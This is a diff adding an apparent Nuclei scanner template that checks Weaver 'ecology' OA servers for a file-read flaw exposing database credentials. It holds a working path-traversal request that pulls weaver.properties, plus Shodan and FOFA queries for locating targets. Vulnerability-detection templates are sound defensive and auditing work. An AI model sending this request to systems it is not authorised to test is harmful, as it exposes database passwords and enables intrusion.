@@ -1,0 +1,40 @@
+id: ecology-info-leak
+
+info:
+  name: Ecology  - Information Exposure
+  author: qianbenhyu
+  severity: high
+  description: |
+    The "ecology" component exposes a file that contains sensitive database credentials (dbuser/dbpass).
+  reference:
+    - https://github.com/xinyisleep/pocscan/blob/main/%E6%B3%9B%E5%BE%AE/oa%E6%B3%9B%E5%BE%AE0day%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.py
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: ecology_JSessionid
+    fofa-query: app="泛微-协同办公OA"
+  tags: ecology,unauth,misconfig,vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ecology.password"
+          - "ecology.charset"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100d09b836d8cb912952885781f1773f13b4f5187295a0ebbd65387c1a7abc39a3902206657ffa9cfe5f61a047334e5a0ca2ef66998743c393352fd9f7f5ee32bc57692:922c64590222798bb761d5b6d8e72950
